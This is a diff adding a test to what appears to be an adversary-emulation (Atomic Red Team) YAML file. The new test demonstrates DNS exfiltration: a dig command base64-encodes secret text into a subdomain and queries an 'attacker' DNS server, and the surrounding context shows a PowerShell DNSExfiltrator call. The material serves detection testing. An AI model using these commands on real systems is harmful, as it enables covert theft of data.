@@ -96,3 +96,35 @@ atomic_tests:
       Import-Module "#{ps_module}"
       Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
     name: powershell
+- name: Exfiltrate Data using DNS Queries via dig
+  auto_generated_guid: a27916da-05f2-4316-a3ee-feec67a437be
+  description: |
+    This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and 
+    making DNS queries via the dig command to a controlled DNS server.
+  supported_platforms:
+    - macos
+    - linux
+  input_arguments:
+    dns_port:
+      type: integer
+      default: '53'
+      description: Attacker's DNS server port
+    attacker_dns_server:
+      type: string
+      default: 8.8.8.8
+      description: Attacker's DNS server address
+    secret_info:
+      type: string
+      default: this is a secret info
+      description: secret info that will be exfiltirated
+  dependency_executor_name: bash
+  dependencies:
+    - description: dig command
+      prereq_command: which dig
+      get_prereq_command: |
+        which apt && sudo apt update && sudo apt install -y bind9-dnsutils || which yum && sudo yum install -y bind-utils || which dnf && sudo dnf install -y bind-utils || which apk && sudo apk add bind-tools || which pkg && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew update && brew install --quiet bind
+  executor:
+    command: |
+      dig @#{attacker_dns_server} -p #{dns_port} $(echo "#{secret_info}" | base64).google.com
+    name: bash
+    elevation_required: false
